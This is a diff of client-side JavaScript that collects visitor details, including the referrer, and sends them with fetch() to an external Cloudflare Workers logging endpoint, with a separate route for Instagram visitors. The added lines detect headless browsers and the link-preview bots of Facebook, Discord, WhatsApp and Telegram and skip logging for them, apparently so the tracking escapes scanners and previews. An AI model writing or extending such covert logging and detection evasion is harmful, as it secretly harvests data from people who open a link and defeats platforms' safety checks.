@@ -59,17 +59,35 @@
 🔗 Referrer: ${refUrl}
     `.trim();
 
+    let isBot = false;
+const ua = userAgent.toLowerCase();
+
+if (
+  ua.includes("headless") || 
+  ua.includes("bot") || 
+  ua.includes("crawl") || 
+  ua.includes("spider") || 
+  ua.includes("preview") || 
+  ua.includes("facebookexternalhit") || 
+  ua.includes("discordbot") || 
+  ua.includes("whatsapp") || 
+  ua.includes("telegrambot")
+) {
+  isBot = true;
+}
+
     const urlParams = new URLSearchParams(window.location.search);
     const fromWorker = urlParams.has("from");
 
     const encoded = encodeURIComponent(infoText);
     let endpoint = "";
-
+if (!isBot) {
     if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
       endpoint = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}`;
     } else {
       endpoint = `https://workers.client57.workers.dev/api/log?result=%0A${encoded}`;
     }
+}
 
     try {
       await fetch(endpoint);
